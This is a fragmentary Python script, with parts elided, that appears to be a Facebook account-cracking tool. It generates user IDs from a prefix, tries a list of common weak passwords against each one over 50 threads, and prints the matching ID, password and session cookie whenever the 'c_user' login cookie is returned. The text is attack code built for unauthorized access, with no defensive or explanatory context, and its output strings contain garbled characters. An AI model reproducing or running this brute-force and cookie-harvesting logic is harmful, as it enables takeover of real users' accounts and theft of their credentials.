...
def uf():
    ...
    with ThreadPool(max_workers=50) as morshed:
        ...
        print("\033[1;32m----------------------------------------")
        for love in user:
            pwx = [love[6:],'bangla','1122555','112266','102040','112255','09876543','mehadi','sharmin','lamiya','sadiya','ariyan','ridoy123']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BLACK-OKðŸ’š] \033[1;32m'+uid+'\033[1;32m â€¢ \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
